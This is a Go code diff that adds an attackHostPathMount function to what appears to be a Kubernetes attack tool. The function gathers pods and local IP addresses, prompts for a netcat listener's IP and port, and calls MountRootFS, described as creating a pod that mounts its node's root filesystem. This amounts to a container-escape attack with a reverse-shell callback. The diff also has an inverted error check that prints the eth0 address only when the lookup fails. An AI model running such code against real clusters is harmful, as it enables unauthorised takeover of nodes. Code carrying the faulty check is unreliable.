@@ -10,6 +10,38 @@ import (
 	"time"
 )
 
+func attackHostPathMount(connectionString ServerInfo, interactive bool) {
+
+	allPods := getPodList(connectionString)
+
+	// Before presenting all IP addresses, give the user the IP address for eth0 if available.
+	eth0IP, err := GetMyIPAddress("eth0")
+	if err != nil {
+		fmt.Println("IP address for eth0 is ", eth0IP)
+	}
+
+	println("Your IP addresses: ")
+	GetMyIPAddressesNative()
+
+	println("What IP and Port will your netcat listener be listening on?")
+	var ip, port string
+	println("IP:")
+	_, err = fmt.Scanln(&ip)
+	if err != nil {
+		println("[-] Error reading IP address.")
+		pauseToHitEnter(interactive)
+		return
+	}
+	println("Port:")
+	_, err = fmt.Scanln(&port)
+	if err != nil {
+		println("[-] Error reading port.")
+		pauseToHitEnter(interactive)
+		return
+	}
+	MountRootFS(allPods, connectionString, ip, port)
+}
+
 // MountRootFS creates a pod that mounts its node's root filesystem.
 func MountRootFS(allPodsListme []string, connectionString ServerInfo, callbackIP, callbackPort string) {
 	var MountInfoVars = MountInfo{}
